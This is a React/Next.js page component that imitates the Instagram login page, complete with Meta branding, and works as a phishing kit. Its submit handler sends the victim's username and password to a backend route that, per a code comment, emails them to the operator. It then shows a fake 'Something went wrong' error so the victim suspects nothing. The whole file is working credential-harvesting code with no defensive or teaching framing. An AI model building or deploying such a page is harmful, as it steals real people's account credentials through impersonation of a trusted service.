'use client';

import { useState } from 'react';
import styles from './page.module.css';

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Send credentials to backend (which sends email via Resend)
      await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });

      // Regardless of success/fail logs, show the fake error to user
      setShowError(true);
      setUsername('');
      setPassword('');
    } catch (err) {
      console.error(err);
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => {
    setShowError(false);
  };

  return (
    <main className={styles.main}>
      <div className={styles.container}>
        {/* LEFT PANEL: Marketing (Desktop Only) */}
        <div className={styles.leftPanel}>
          {/* Logo Icon */}
          <div className={styles.instaIconLarge}>
            <img src="/instagram_logo.jpg" alt="Instagram Logo" style={{ width: '60px', height: '60px', objectFit: 'contain' }} />
          </div>

          <h1 className={styles.marketingText}>
            See everyday moments from your <span className={styles.closeFriends}>close friends</span>.
          </h1>

          <img
            src="/hero_collage.png"
            alt="App Screenshot Collage"
            className={styles.collageImage}
          />
        </div>

        {/* RIGHT PANEL: Login Form (Visible on all screens) */}
        <div className={styles.rightPanel}>
          <div className={styles.loginCard}>
            {/* Header: Login Title Image */}
            <img
              src="/login_title.png"
              alt="Log into Instagram"
              className={styles.headerTitle}
            />

            <form onSubmit={handleSubmit} className={styles.form}>
              <input
                type="text"
                placeholder="Mobile number, username or email"
                className={styles.input}
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
              <input
                type="password"
                placeholder="Password"
                className={styles.input}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              <button
                type="submit"
                className={styles.loginButton}
                disabled={!username || !password || loading}
              >
                {loading ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            <div className={styles.forgotPassword}>
              Forgot password?
            </div>

            <div className={styles.facebookLoginBtn}>
              <span style={{ fontWeight: 'bold', fontSize: '1.2em', marginRight: '8px' }}>f</span>
              Log in with Facebook
            </div>

            <div className={styles.createAccountBtn}>
              Create new account
            </div>

            <div className={styles.metaLogo}>
              <span className={styles.metaText}>from</span>
              <span className={styles.metaVal}>Meta</span>
            </div>
          </div>
        </div>
      </div>

      {showError && (
        <div className={styles.popupOverlay}>
          <div className={styles.popupContent}>
            <h3 className={styles.popupTitle}>Error</h3>
            <p className={styles.popupMessage}>Somthing went wrong please try after some time again</p>
            <div className={styles.dismissButton} onClick={closePopup}>
              Dismiss
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
